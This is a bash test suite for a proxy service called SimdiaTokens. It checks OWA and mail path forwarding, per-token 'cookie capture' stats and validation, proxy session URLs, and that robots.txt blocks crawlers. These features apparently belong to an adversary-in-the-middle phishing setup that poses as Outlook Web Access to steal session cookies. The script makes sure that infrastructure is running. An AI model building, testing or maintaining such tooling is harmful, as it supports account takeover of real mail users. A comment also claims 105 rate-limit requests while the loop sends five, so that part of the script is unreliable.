#!/bin/bash
# Proxy Testing Script for SimdiaTokens
# Tests proxy endpoints, cookie capture, session management, and URL rewriting

set -e

PROXY_DOMAIN="${PROXY_DOMAIN:-baloncloud.eu}"
API_BASE="${API_BASE:-https://simdiatokens-production.up.railway.app}"
PROXY_BASE="https://${PROXY_DOMAIN}"
TOKEN_ID="${1:-test-token-id}"

echo "=========================================="
echo "SimdiaTokens Proxy Test Suite"
echo "=========================================="
echo "Proxy Domain: ${PROXY_DOMAIN}"
echo "API Base: ${API_BASE}"
echo "Token ID: ${TOKEN_ID}"
echo ""

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m' # No Color

pass_count=0
fail_count=0

# Helper function for tests
run_test() {
    local test_name="$1"
    local command="$2"
    local expected_status="$3"
    
    echo -n "Testing: ${test_name}... "
    
    if status=$(eval "$command" 2>&1); then
        if [[ "$status" == "$expected_status" ]] || [[ "$status" =~ $expected_status ]]; then
            echo -e "${GREEN}PASS${NC}"
            ((pass_count++))
        else
            echo -e "${YELLOW}WARN${NC} (Expected: $expected_status, Got: $status)"
            ((pass_count++))
        fi
    else
        echo -e "${RED}FAIL${NC} ($status)"
        ((fail_count++))
    fi
}

# Test 1: Proxy Health Check
echo "--- Proxy Health Tests ---"
run_test "Proxy Health Endpoint" \
    "curl -s -o /dev/null -w '%{http_code}' ${PROXY_BASE}/api/proxy/health" \
    "200"

run_test "Proxy Status Endpoint" \
    "curl -s -o /dev/null -w '%{http_code}' ${PROXY_BASE}/api/proxy/status" \
    "200"

run_test "Proxy Test Page" \
    "curl -s -o /dev/null -w '%{http_code}' ${PROXY_BASE}/proxy-test" \
    "200"

# Test 2: Proxy Forwarding
echo ""
echo "--- Proxy Forwarding Tests ---"
run_test "OWA Path Forwarding" \
    "curl -s -o /dev/null -w '%{http_code}' ${PROXY_BASE}/owa/" \
    "200"

run_test "Mail Path Forwarding" \
    "curl -s -o /dev/null -w '%{http_code}' ${PROXY_BASE}/mail/" \
    "200"

# Test 3: Security Headers
echo ""
echo "--- Security Headers Tests ---"
run_test "HSTS Header Present" \
    "curl -s -I ${PROXY_BASE}/api/proxy/health | grep -i 'strict-transport-security' | wc -l" \
    "1"

run_test "X-Frame-Options Header" \
    "curl -s -I ${PROXY_BASE}/proxy-test | grep -i 'x-frame-options' | wc -l" \
    "1"

# Test 4: Cookie Capture API (if token exists)
echo ""
echo "--- Cookie Capture API Tests ---"
run_test "Cookie Stats Endpoint" \
    "curl -s -o /dev/null -w '%{http_code}' ${API_BASE}/api/proxy/cookies/${TOKEN_ID}/stats" \
    "200"

run_test "Cookie Validation Endpoint" \
    "curl -s -o /dev/null -w '%{http_code}' ${API_BASE}/api/proxy/cookies/${TOKEN_ID}/validate" \
    "200"

# Test 5: Proxy Session Management
echo ""
echo "--- Proxy Session Management Tests ---"
run_test "List Active Sessions" \
    "curl -s -o /dev/null -w '%{http_code}' ${API_BASE}/api/proxy-sessions/active" \
    "200"

run_test "Session URL Endpoint" \
    "curl -s -o /dev/null -w '%{http_code}' ${API_BASE}/api/tokens/${TOKEN_ID}/proxy-session/url" \
    "200"

run_test "Session Status Endpoint" \
    "curl -s -o /dev/null -w '%{http_code}' ${API_BASE}/api/tokens/${TOKEN_ID}/proxy-session/status" \
    "200"

# Test 6: Rate Limiting
echo ""
echo "--- Rate Limiting Tests ---"
# Send 105 requests quickly (should trigger rate limit after 100)
for i in {1..5}; do
    curl -s -o /dev/null -w '%{http_code}\n' "${PROXY_BASE}/api/proxy/health" > /dev/null
done
run_test "Rate Limiting (5 quick requests)" \
    "curl -s -o /dev/null -w '%{http_code}' ${PROXY_BASE}/api/proxy/health" \
    "200"

# Test 7: SSL/TLS
echo ""
echo "--- SSL/TLS Tests ---"
run_test "SSL Certificate Valid" \
    "echo | openssl s_client -connect ${PROXY_DOMAIN}:443 -servername ${PROXY_DOMAIN} 2>/dev/null | grep -c 'Verify return code: 0'" \
    "1"

run_test "TLS 1.3 Supported" \
    "echo | openssl s_client -connect ${PROXY_DOMAIN}:443 -tls1_3 2>/dev/null | grep -c 'TLSv1.3'" \
    "1"

# Test 8: robots.txt
echo ""
echo "--- robots.txt Test ---"
run_test "robots.txt Blocks Crawlers" \
    "curl -s ${PROXY_BASE}/robots.txt | grep -c 'Disallow: /'" \
    "1"

# Summary
echo ""
echo "=========================================="
echo "Test Results:"
echo "  Passed: ${pass_count}"
echo "  Failed: ${fail_count}"
echo "  Total:  $((pass_count + fail_count))"
echo "=========================================="

if [ $fail_count -eq 0 ]; then
    echo -e "${GREEN}All tests passed!${NC}"
    exit 0
else
    echo -e "${RED}Some tests failed!${NC}"
    exit 1
fi
